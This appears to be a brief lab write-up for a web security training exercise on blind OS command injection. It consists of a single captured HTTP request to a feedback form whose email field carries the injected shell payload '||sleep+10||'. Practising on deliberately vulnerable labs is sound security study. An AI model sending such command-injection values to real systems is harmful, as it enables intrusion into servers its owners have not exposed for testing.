# Lab: Blind OS command injection with time delays
```http
POST /feedback/submit HTTP/2
Host: 0aac0067046083b2800f58cb00ac00b7.web-security-academy.net
Cookie: session=Q3WrawheIHugo7rxE8Uwe2xdN4DuVKYo
Content-Length: 95
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: */*
Origin: https://0aac0067046083b2800f58cb00ac00b7.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0aac0067046083b2800f58cb00ac00b7.web-security-academy.net/feedback
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

csrf=qhbKZz4Rzk84SLFrBMApge89yzKlzy74&name=23423&email=||sleep+10||&subject=34&message=24444444
```

